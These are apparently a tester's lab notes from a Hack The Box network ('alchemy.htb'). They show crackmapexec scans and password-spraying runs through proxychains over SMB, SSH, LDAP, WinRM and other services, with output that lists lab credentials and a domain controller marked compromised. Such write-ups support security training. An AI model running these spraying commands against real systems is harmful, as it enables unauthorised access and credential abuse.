### proxychains crackmapexec smb 172.16.0.0/24
#crackmapexec #smb
```bash
proxychains crackmapexec smb 172.16.0.0/24                                                                                                                                              
SMB         172.16.0.33     445    WS02             [*] Windows 10.0 Build 19041 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:False)                                      
SMB         172.16.0.2      445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:alchemy.htb) (signing:True) (SMBv1:True)                       
SMB         172.16.0.32     445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:False)  
```

```bash
proxychains crackmapexec smb 172.16.0.0/24 -u userlist -p passlist         

SMB         172.16.0.32     445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         172.16.0.2      445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:alchemy.htb) (signing:True) (SMBv1:True)
SMB         172.16.0.33     445    WS02             [*] Windows 10.0 Build 19041 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:False)
SMB         172.16.0.32     445    WS01             [-] WS01\calde_ldap:CsAdlLDAPMoDeBrnd12! STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\calde_ldap:LandIAtErOUs STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12! STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\calde_ldap@alchemy.htb:LandIAtErOUs STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\calde:CsAdlLDAPMoDeBrnd12! STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\calde:LandIAtErOUs STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\aepike:CsAdlLDAPMoDeBrnd12! STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\aepike:LandIAtErOUs STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12! STATUS_LOGON_FAILURE 
SMB         172.16.0.32     445    WS01             [-] WS01\aepike@alchemy.htb:LandIAtErOUs STATUS_LOGON_FAILURE 
SMB         172.16.0.2      445    DC               [+] alchemy.htb\calde_ldap:CsAdlLDAPMoDeBrnd12! 
SMB         172.16.0.33     445    WS02             [+] WS02\calde_ldap:CsAdlLDAPMoDeBrnd12! 

```
### proxychains crackmapexec ssh 172.16.0.0/24 
#crackmapexec #ssh
```bash
proxychains crackmapexec ssh 172.16.0.0/24                                                                                                                                                       
SSH         172.16.0.21     22     172.16.0.21      [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5                                                                                   
SSH         172.16.0.20     22     172.16.0.20      [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7                                                                                   
SSH         172.16.0.3      22     172.16.0.3       [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3                                                                                    
SSH         172.16.0.1      22     172.16.0.1       [*] SSH-2.0-OpenSSH_9.4  
```

```bash
proxychains crackmapexec ssh 172.16.0.0/24 -u userlist -p passlist                                                                                                                                                                                                                                                                        
SSH         172.16.0.21     22     172.16.0.21      [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.5                                                                                   
SSH         172.16.0.20     22     172.16.0.20      [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
SSH         172.16.0.3      22     172.16.0.3       [*] SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
SSH         172.16.0.1      22     172.16.0.1       [*] SSH-2.0-OpenSSH_9.4
SSH         172.16.0.20     22     172.16.0.20      [-] calde_ldap:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] calde_ldap:LandIAtErOUs Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] calde_ldap@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] calde:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] calde:LandIAtErOUs Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] aepike:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] aepike:LandIAtErOUs Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.20     22     172.16.0.20      [-] aepike@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde_ldap:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde_ldap:LandIAtErOUs Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde_ldap@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] calde:LandIAtErOUs Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] aepike:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] aepike:LandIAtErOUs Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.3      22     172.16.0.3       [-] aepike@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.1      22     172.16.0.1       [-] calde_ldap:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.1      22     172.16.0.1       [-] calde_ldap:LandIAtErOUs Authentication timeout.
SSH         172.16.0.1      22     172.16.0.1       [-] calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12! [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] calde_ldap@alchemy.htb:LandIAtErOUs [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] calde:CsAdlLDAPMoDeBrnd12! [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] calde:LandIAtErOUs [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] aepike:CsAdlLDAPMoDeBrnd12! [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] aepike:LandIAtErOUs [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12! [Errno None] Unable to connect to port 22 on 172.16.0.1
SSH         172.16.0.1      22     172.16.0.1       [-] aepike@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde_ldap:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde_ldap:LandIAtErOUs Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde_ldap@alchemy.htb:LandIAtErOUs Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde:LandIAtErOUs Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] calde:LandIAtErOUs Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [-] aepike:CsAdlLDAPMoDeBrnd12! Authentication failed.
SSH         172.16.0.21     22     172.16.0.21      [+] aepike:LandIAtErOUs 

```
### proxychains crackmapexec ldap 172.16.0.0/24 
#crackmapexec #ldap
```bash
proxychains crackmapexec ldap 172.16.0.0/24                                                                                                                                      

SMB         172.16.0.32     445    WS01             [*] Windows 10.0 Build 19041 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:False)                                      
SMB         172.16.0.33     445    WS02             [*] Windows 10.0 Build 19041 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:False)                                      
SMB         172.16.0.2      445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:alchemy.htb) (signing:True) (SMBv1:True)  
```
### proxychains crackmapexec ftp 172.16.0.0/24
- nothing found
#crackmapexec #ftp 
```bash
proxychains crackmapexec ftp 172.16.0.0/24
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
```
### proxychains crackmapexec winrm 172.16.0.0/24   
- pwned
#crackmapexec #winrm
```bash
proxychains crackmapexec winrm 172.16.0.0/24 -u userlist -p passlist

SMB         172.16.0.33     5985   WS02             [*] Windows 10.0 Build 19041 (name:WS02) (domain:WS02)
SMB         172.16.0.32     5985   WS01             [*] Windows 10.0 Build 19041 (name:WS01) (domain:WS01)
SMB         172.16.0.2      5985   DC               [*] Windows 6.3 Build 9600 (name:DC) (domain:alchemy.htb)
HTTP        172.16.0.33     5985   WS02             [*] http://172.16.0.33:5985/wsman
HTTP        172.16.0.32     5985   WS01             [*] http://172.16.0.32:5985/wsman
HTTP        172.16.0.2      5985   DC               [*] http://172.16.0.2:5985/wsman
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde_ldap:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde_ldap:LandIAtErOUs
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde_ldap@alchemy.htb:LandIAtErOUs
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.32     5985   WS01             [-] WS01\calde:LandIAtErOUs
WINRM       172.16.0.32     5985   WS01             [-] WS01\aepike:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.32     5985   WS01             [-] WS01\aepike:LandIAtErOUs
WINRM       172.16.0.32     5985   WS01             [-] WS01\aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.32     5985   WS01             [-] WS01\aepike@alchemy.htb:LandIAtErOUs
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde_ldap:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde_ldap:LandIAtErOUs
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde_ldap@alchemy.htb:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde_ldap@alchemy.htb:LandIAtErOUs
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.33     5985   WS02             [-] WS02\calde:LandIAtErOUs
WINRM       172.16.0.33     5985   WS02             [-] WS02\aepike:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.33     5985   WS02             [-] WS02\aepike:LandIAtErOUs
WINRM       172.16.0.33     5985   WS02             [-] WS02\aepike@alchemy.htb:CsAdlLDAPMoDeBrnd12!
WINRM       172.16.0.33     5985   WS02             [-] WS02\aepike@alchemy.htb:LandIAtErOUs
WINRM       172.16.0.2      5985   DC               [+] alchemy.htb\calde_ldap:CsAdlLDAPMoDeBrnd12! (Pwn3d!)


```
### proxychains crackmapexec mssql 172.16.0.0/24   
- nothing
#crackmapexec #mssql
```bash

┌──(kali㉿gobots)-[13Jun2024 18:36:47]-[~/SUT/Alchemy]
└─$ proxychains crackmapexec mssql 172.16.0.0/24
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17

```